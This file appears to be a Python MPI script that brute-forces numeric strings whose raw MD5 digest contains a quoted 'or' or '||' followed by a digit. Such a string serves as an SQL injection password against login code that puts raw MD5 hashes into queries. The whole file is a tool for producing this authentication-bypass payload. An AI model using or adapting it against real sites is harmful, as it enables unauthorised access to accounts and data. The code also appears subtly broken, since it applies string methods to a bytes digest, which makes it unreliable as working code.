import hashlib, random, string, re, sys
from mpi4py import MPI

def containsOr(input):
    pos1 = input.find("'||'")
    if pos1 >= 0: # valid
        return input[pos1 + 4].isdigit()
    else:
        pos2 = input.lower().find("'or'")
        if pos2 >= 0: # valid
            return input[pos2 + 4].isdigit()
    return False

comm = MPI.COMM_WORLD
size = comm.Get_size()
rank = comm.Get_rank()

HASH_SIZE = 100000

start = random.randint(0, 123456789012345678901234567890 - HASH_SIZE) + (rank * HASH_SIZE)
print("Rank " + str(rank) + " is moving to set " + str(start) + " to " + str(start + 100000))
while True:
    for x in range(start, start + HASH_SIZE):
        testString = str(x).encode()
        testHash = hashlib.md5(testString).digest()
        if (containsOr(testHash)):
            print(testString)
            comm.Abort(0)
    # start = start + ((rank + size) * HASH_SIZE)
    start = random.randint(0, 123456789012345678901234567890 - HASH_SIZE) + (rank * HASH_SIZE)
    print("Rank " + str(rank) + " is moving to set " + str(start) + " to " + str(start + 100000))
